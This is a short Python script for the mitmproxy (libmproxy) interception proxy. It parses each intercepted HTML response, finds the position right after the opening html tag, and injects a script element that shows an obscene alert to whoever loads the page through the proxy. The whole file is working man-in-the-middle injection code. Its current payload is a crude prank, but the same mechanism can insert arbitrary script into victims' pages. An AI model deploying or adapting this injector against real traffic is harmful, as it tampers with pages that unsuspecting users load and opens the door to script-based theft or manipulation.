from HTMLParser import HTMLParser
from libmproxy.models import decoded


injected = """
<script>
    alert("Fuck you.");
</script>
"""


def debug(s):
    with open('out.txt', 'a') as file:
        file.write(str(s))


def find_true_offset(string, lineno, line_offset):
    debug(' lineno:' + str(lineno) + ', line_offset:' + str(line_offset) + ' ')
    if lineno > 1:
        newline_count = 1
        for i, c in enumerate(string):
            if c == '\n':
                newline_count += 1
                if newline_count == lineno:
                    return i + line_offset + 1

    return line_offset 


def response(context, flow):
    def inject(lineno, offset):
        debug('1')
        true_offset = find_true_offset(flow.response.content, lineno, offset)
        debug('2')
        flow.response.content = (flow.response.content[:true_offset] +
            injected + flow.response.content[true_offset:])
        
    with decoded(flow.response):
        lineno, offset = find_injection_offset(flow.response.content) 
        if lineno is not None and offset is not None:
            inject(lineno, offset)
        

def find_injection_offset(html):
    thing = Empty()

    def callback(lineno, offset):
        thing.lineno = lineno
        thing.offset = offset

    parser = OurHTMLParser()
    parser.callback = callback
    parser.feed(html)
    return thing.lineno, thing.offset


class OurHTMLParser(HTMLParser):
    def handle_starttag(self, tag, attrs):
        if tag == 'html':
            lineno, offset = self.getpos()
            offset += len(self.get_starttag_text())
            self.callback(lineno, offset)


class Empty:
    pass
